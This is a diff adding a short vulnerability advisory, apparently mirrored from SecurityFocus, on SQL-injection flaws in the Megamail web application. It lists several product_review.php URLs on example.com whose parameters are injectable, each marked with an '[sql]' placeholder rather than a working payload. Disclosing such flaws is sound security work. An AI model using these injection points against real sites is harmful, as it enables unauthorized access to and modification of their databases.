@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/21072/info
+
+Megamail is prone to multiple SQL-injection vulnerabilities because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.
+
+Exploiting these issues could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database implementation.
+
+http://example.com/mega-mall/product_review.php?t=[sql]
+http://example.com/mega-mall/product_review.php?t=0&productId=[sql]
+http://example.com/mega-mall/product_review.php?t=0&productId=1004&sk=[sql]
+http://example.com/mega-mall/product_review.php?t=0&productId=1004&t=0&x=[sql]
+http://example.com/mega-mall/product_review.php?t=0&productId=1004&sk=USERID&so=[sql]
